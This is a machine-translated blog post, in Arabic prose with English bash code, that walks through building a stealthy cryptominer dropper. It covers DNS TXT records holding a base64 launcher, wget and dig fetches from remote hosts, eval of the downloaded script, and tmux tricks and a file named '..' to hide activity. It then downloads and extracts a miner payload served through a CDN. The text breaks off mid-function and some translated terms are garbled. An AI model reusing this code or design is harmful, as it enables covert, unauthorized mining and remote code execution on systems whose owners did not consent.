both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> سجلات قطارة كريبتونوت</title><script type=application/ld+json>{"url":"/ar/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/ar/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-11-16T18:35:27.259","inLanguage":"ar","name":"","mainEntityOfPage":{"@id":"/ar/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/ar/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ar/posts/><i class="fas fa-pen menu-icons"></i> دعامات</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ar/media/><i class="fas fa-tv menu-icons"></i> وسائط</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ar/posts/><i class="fas fa-pen menu-icons"></i> دعامات</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ar/media/><i class="fas fa-tv menu-icons"></i> وسائط</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/ar/posts/chronichles_of_a_cryptonote_dropper> سجلات قطارة كريبتونوت</a></h1><blockquote id=page-description style=font-style:italic>... إلى أي مدى أنت على استعداد للذهاب مقابل ... بنسات؟</blockquote></div><div class=franklin-content><p>افترض أنك تريد الألغام<a href=https://en.wikipedia.org/wiki/Cryptocurrency> العملات الرقمية</a> على جهاز التحكم عن بعد<em> افتراضية</em> المعدات. أنت بحاجة إلى العثور على شيء لي. الخوادم البعيدة تعني لا<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> أو إثبات GPU لخوارزميات العمل ، بشكل أساسي فقط<a href=\posts/a-few-notes-on-proof-of-work> عملات صديقة لوحدة المعالجة المركزية</a>.<h2 id=the_software><a class=header-anchor href=#the_software> البرنامج</a></h2><p>ابحث واعثر على ملف<a href=https://github.com/xmrig/xmrig> عامل منجم</a> ، ولكن هذا ليس لطيفًا حقًا ، فأنت تريد شيئًا يمكنك التحكم فيه بشكل أفضل من جهاز التحكم عن بُعد ، لذلك تجده<a href=https://github.com/Bendr0id/xmrigCC> عامل منجم آخر</a> . أنت أيضًا تريد ملف<a href=https://github.com/Bendr0id/xmrigcc-proxy> الوكيل</a> ، لأن العديد من الاتصالات ستكون قصيرة العمر ، فأنت لا تريد ذلك<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> دوس</a> تجمع التعدين الخاص بك. أبضا<a href=https://github.com/search?q=tunnel> نفق</a> سيكون جميلا.<h2 id=the_design><a class=header-anchor href=#the_design> التصميم</a></h2><p>تستخدم بعض شبكات الروبوت بيانات blockchains للبحث عن الأوامر ،<a href=https://twitter.com/sarahjamielewis> شخص ما</a> يبدو أيضًا أن<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> خسر الرهانات</a> على هذا لا يحدث مرة أخرى ... على أي حال لسنا متطورين إلى هذا الحد ، سوف نتعامل مع بعض سجلات DNS التي تخزن برنامج نصي يسحب الحمولة التي ينفذها الاستخراج الذاتي في دليل مؤقت ويغادر<em> تقريبيا</em> لا يوجد أثر لإعداده. فيما يلي مخطط تدفق صغير يصور الهيكل<h2 id=launcher><a class=header-anchor href=#launcher> منصة الإطلاق</a></h2><p>الهدف من البرنامج النصي لبدء التشغيل هو أن يكون الوصول إليه قابلاً للتحديث بسهولة بحيث يقاوم اختبار الزمن. التحديث<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> السجلات سهلة ، و DNS هو آخر شيء يتم إيقاف تشغيله داخل الشبكة .. لأن عناوين IP يصعب تذكرها ... لذا فمن المحتمل أن تكون متاحة في معظم الأوقات. ترى عندما نكون<em> إحضار نص النشر</em>نحن بالفعل نقوم بالفعل بتشغيل بعض المنطق ، وهذا هو البرنامج النصي للمشغل ، فهو يحتاج إلى القدرة على تنفيذ استعلامات DNS للبحث في سجلاتنا ، وقد يكون DNS موجودًا في كل مكان ولكن<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> حفر</a> ليس.<p>هناك القليل من اللغز هنا ، إذا كان علينا تنزيل أداة أخرى<em> لتنزيل برنامج نصي آخر لتنزيل الحمولة</em> يجب علينا فقط تنزيل الحمولة! في الدفاع ... يؤدي القيام بهذه الرقصة النصية إلى زيادة التشويش ، ويسمح بالاحتفاظ بتطبيق واحد فقط للقاذفة (قابلية الصيانة ، نعم) ، وهو أمر غير مطلوب في معظم الأوقات .. لذا فنحن أيضًا نقدم خدمة<a href=https://en.wikipedia.org/wiki/Standalone_program> مرتبط بشكل ثابت</a> حفر قابل للتنفيذ لأداء استعلامات نظام أسماء النطاقات ، التي يتم جلبها إما عن طريق الاستضافة الذاتية ، أو الاستضافة السحابية (نعم ، هناك احتياطات ، مثل 3 أو 4 ، لأن الخدمات السحابية لديها الحد الأدنى من النطاق الترددي المجاني ، وتتطلب أيضًا ملفات تعريف الارتباط أو رموز الوصول ... غير ودي ، عن قصد ، بالطبع).<p>ماذا يوجد في سجلات نظام أسماء النطاقات؟ نحن نستخدم<a href=https://en.wikipedia.org/wiki/TXT_record> رسالة قصيرة</a> السجلات ، على مجال مخصص (الاحتياطيات هنا أيضًا). لماذا TXT؟ هم الذين يمكنهم تخزين أكبر كمية من البيانات .. عادة لأنها نوع من<a href=https://www.ietf.org/rfc/rfc6763.txt> موصى به</a> اعتمادا علي<em> أشياء</em> . نحن نستخدم على وجه التحديد<a href=https://www.cloudflare.com/> كلود فلير</a> لتلاعب نظام أسماء النطاقات لدينا نظرًا لأنه مجاني ، وهو إلى حد كبير اللاعب الوحيد في المدينة (<em> حسنًا ، ليس حقًا ولكن أي ميزات بديلة أخرى حكيمة</em> ). يحدث أنه يمكنك تخزين أجزاء متعددة من البيانات على ملف<em> نفس</em> سجل ... هذا يبدأ في الالتباس والتزاحم لبعض المواصفات ... (الظل) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> اعتدت ان</a> السماح<em> مقيد</em>سجلات TXT التي يبلغ مجموعها 9 كيلو بايت تقريبًا ، تشير المستندات الآن إلى 2 كيلو بايت ، قبل التغيير الذي كنت أستخدمه 6 كيلو بايت على ما أعتقد ، وكنت أخدم البرنامج النصي غير مضغوط ، وبعد ذلك اضطررت إلى تخفيف النص وضغطه مسبقًا (في الواقع أنا حاول استخدام أ<a href=https://freedns.afraid.org/> المحررين</a> مقدم الخدمة ، لقد تم حظري في غضون يوم واحد ، على الرغم من أن لديهم سياسة صارمة لسجلات TXT خالية من الدهون) ، ومع ذلك يبدو أن ضغط gzip ليس ملائمًا للأنابيب ولا يزال يسبب مشاكل ، لذلك كان علي أن أتمكن من حشر البرنامج النصي دون ضغط ( ظل الزاوية).<p>كيف نخزنها؟ تدعم سجلات TXT السلاسل الأبجدية الرقمية فقط ، لا<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> ، لذلك علينا أن نلفها في ترميز غير فارغ ،<a href=https://en.wikipedia.org/wiki/Base64> قاعدة 64</a> يفي بهذا القيد ، ولأننا نقوم بتخزين<em> مقيد</em> TXT ، يجب علينا تقسيم الإخراج ، نظرًا لأننا نستخدم مواد shell ، يتم ذلك من خلال ملف<code>-w</code> علم ، في BUSYBOX ، اعتادت هذه العلامة أن تكون غائبة (أو مشتركة) في الإصدارات الأقدم والتي كانت مزعجة ، والبديل هو استخدام برنامج التشفير المرفق مع openssl ،<code>openssl enc -base64</code>.<p>الآن بعد أن عرفنا كيفية تخزين البرنامج النصي للنشر ، نقوم بتخزينه مع أي منهما<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> أو يدويًا. كيف نسحبها؟ ذكرنا أننا بحاجة إلى أدوات ربط أو أدوات خاصة بنا<code>dig</code> ... بعد اختيار نقطة نهاية العرض ، نريد تنزيله ، وعادة ما يكون المتاح<a href=https://www.gnu.org/software/wget/> wget</a> أو<a href=https://curl.se/> لفة</a> ، تم العثور على wget مثبتًا مسبقًا في كثير من الأحيان ، ومع ذلك ، يوفر Busbox فقط دعم TLS مع المكتبات الديناميكية ، لذلك عليك التأكد من أن نقطة النهاية تخدم http أو أن فائدتك<code>wget</code> من gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>إنه يعني المحاولة<code>-t2</code> مرات الانتظار<code>-T10</code> ثواني يجري<code>-q</code> قراءة هادئة من<code>-i-</code> ستدين (<code>$digurl</code> ) والكتابة إلى<code>-O-</code> stdout (<code>$filename</code>). لا يكشف هذا الأمر عما نقوم بتنزيله من النظرة الأولى. سنكون حذرين للغاية مع أوامر shell الأخرى لنفس السبب ، أو التمسك بالصدفة (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> سحق</a> ) مدمجة حيثما أمكن ذلك. اهتم أيضًا بالمكان الذي تقوم فيه بتنزيل الملفات التنفيذية الخاصة بك ، فأنت تريد التأكد من أنه يمكنك تنفيذها ، نظرًا لأن بعض نقاط التحميل ، خاصة في الحاويات و<code>tmp</code> المسارات<code>noexec</code> . الآن بعد أن أصبح لدينا أداة استعلام DNS الخاصة بنا ، قمنا بإحضار سجلاتنا<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>الأعلام هنا تشرح نفسها بنفسها ،<code>+short</code> يعني فقط أننا مهتمون بالبيانات نفسها فقط ، حتى لا نضطر إلى تحليل المخرجات. من المهم تحديد خادم DNS ، مثل google (<code>8.8.8.8</code> ) أو cloudflare (<code>1.1.1.1</code> ) لأن العديد من البيئات تعيد توجيه استعلامات DNS أو الوكيل إلى خوادم DNS الخاصة بها افتراضيًا. بعد إحضار البرنامج النصي المقسم ، نتعامل مع علامات الاقتباس والمسافات البيضاء لجعله جاهزًا لفك التشفير<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>ماذا لو كنا الآن<em> ساكن</em> ليس لديك قاذفة لدينا؟ DNS فوضوي ، نريد احتياطيًا ، يتيح إعداد نطاق فرعي لجلب البرنامج النصي للمشغل مباشرة. قبل تقييم البرنامج النصي الخاص بنا ، نريد تخصيصه ، مع بعض المتغيرات ، مرة أخرى ، دعنا نستخدم سجل TXT لتخزين قائمة المتغيرات NAME = VALUE وتحليلها. هناك أيضًا احتياطي للمتغيرات ، تقدم cloudflare عمليات إعادة توجيه استنادًا إلى عناوين URL ، ويتم تقديم عمليات إعادة التوجيه هذه<em> قبل</em> الوجهة ، لذلك لا نحتاج إلى نقطة نهاية ، نريد فقط تكوين قواعد إعادة التوجيه القائمة على regex إلى نقطة نهاية وهمية ، ما يهمنا هو معلمات عنوان url<code>?NAME=VALUE&NAME2=VALUE2...</code>، حتى نتمكن من تحديد معالم المشغل الخاص بنا ببساطة عن طريق تغيير عنوان URL لإعادة التوجيه ، مع الانتباه دائمًا إلى الاقتباس والتخلص من الرموز<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>الويجيت<code>-S</code> طباعة عنوان url لإعادة التوجيه الذي نهتم به لتحليله. بوجود المعلمات والنص ، نقوم بتقييم المتغيرات بكتابتها في ملف<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>سيتم الحصول على هذا الملف من خلال نشر البرنامج النصي. الجزء الأخير من البرنامج النصي لبدء التشغيل هو الفعلي<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> الترامبولين</a> ، قم بتقييم البرنامج النصي في عملية shell الحالية ، أو دعه يُدار بواسطة tmux إن أمكن.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>يتم تفريغ نص المشغل في ملف يسمى ".." يبدو هذا محيرًا لأنه يمكن أن يكون مخطئًا على أنه ملف<em> الأبوين</em> الدليل. ونحن لا نقوم بتضمين أمر الجلسة ، لأن ذلك سيبقى في أمر العملية ، وبدلاً من ذلك نبدأ جلسة tmux مسبقًا ونرسل الأمر المصدر من خلال واجهة tmux الطرفية. مرتبطًا بهذا ، أحيانًا يتم استدعاء ملف تنفيذي بامتداد<code>./</code> يحتفظ بهذه الأحرف في الأمر ، لذلك من الأفضل إضافة<code>$PWD</code> الى الطريق ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> الحمولة</a></h2><p>يبدأ سكريبت النشر لدينا بتحديد مصادر<code>env.sh</code> ملف ، وحفظ أو تكوين vars كـ<code>STARTING_*</code> فارز مثل<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>هذا يسمح لنا بقتل وإعادة تشغيل مثيل قيد التشغيل أثناء إعادة ضبط البيئة. يتيح التبديل إلى دليل tmp بقدرات exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>تحقق مما إذا كان ضمن ملف<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> وعاء</a> مفيد أيضًا ، يمكننا فحص نظام الملفات بحثًا عن تلميحات<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>حان الوقت الآن لتنزيل حمولتنا ، اخترنا دعم كل من wget و curl ، فنحن نعرف بالفعل كيفية استخدام wget مع إشارات دقيقة ، لأن curl يختلف قليلاً. علينا إنشاء ملف التكوين ، وتجاوز<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>الخطوة الأخيرة هي فقط استخراج الحمولة<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>من الجدير بالذكر استخدام [CDN] لخدمة الحمولة. هنا مرة أخرى ينقذنا Cloudflare للإنقاذ من نفقات النطاق الترددي. ببساطة عن طريق إعادة تسمية حمولتنا المضغوطة بامتداد<em> امتداد الملف</em> بدعم من cloudflare ... يصبح مؤقتًا. لا تتحقق Cloudflare من عناوين ما تخدمه ، ربما لأن القيام بذلك على هذا النطاق هو ببساطة غير عملي.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> مغامرات في باشلاند</a></h2><p>تم اختيار Bash بافتراض أنها محمولة ولا تبدو في غير محله وهي موجودة في كل مكان مقارنة بلغات البرمجة النصية الأخرى مثل perl أو ruby ​​أو python. الحقيقة هي أن ثنائيًا مستقلًا مكتوبًا بلغة golang أو lua كان سيكون أسهل بكثير ، مع وجود أخطاء أقل ، وأسهل في الصيانة ، كان bash أساسًا هو أسوأ خيار ممكن ، في دفاعي ، بحلول الوقت الذي خدشت فيه الكثير من الحكة باستخدام bash ، لقد فات الأوان لإعادة الكتابة ، كما أنها أصبحت مملة نوعًا ما.<p>كان هناك أيضًا خيار استخدام busybox مع علامة وقت التجميع لاستخدام جميع العناصر المضمنة (مثل grep و sed) ، ولكن استخدام العناصر المدمجة بهذه الطريقة لا يسمح بتوليد الوظائف (fork) ويعرض البرنامج الخفي إلى الجمود المحتمل.<p>سوف أصف بعض وظائف bash هنا ، مع توفر القائمة الكاملة<a href=\assets/posts/bash_functions.txt> هنا</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>استخدم ال<code>RANDOM</code> متغير للحصول على رقم بين 97-122 مطابق لرمز الحرف ، يجب أن يكون printf مدمجًا ، ولا نريد أن نتفرع داخل حلقة.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>الاستفادة من الأنابيب لإنشاء واصفات ملفات مجهولة ، فهذه لا تتصرف تمامًا مثل واصفات الملفات ولكنها جيدة بما يكفي لـ<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>النوم بدون تشعب ، من خلال إساءة استخدام وظيفة مهلة القراءة المضمنة ، فإنه يستخدم واصف ملف مخصص ويجب علينا التأكد من توفره لتجنب الإنهاء.<p>هناك وظائف مثل<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> تستخدم لمراقبة استخدام النظام ، وكلها تستخدم نظام لينكس<code>/proc</code> ملفات بدون أدوات مثل<code>ps</code> ، لذلك لا تفرز ، كل باش خالص.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
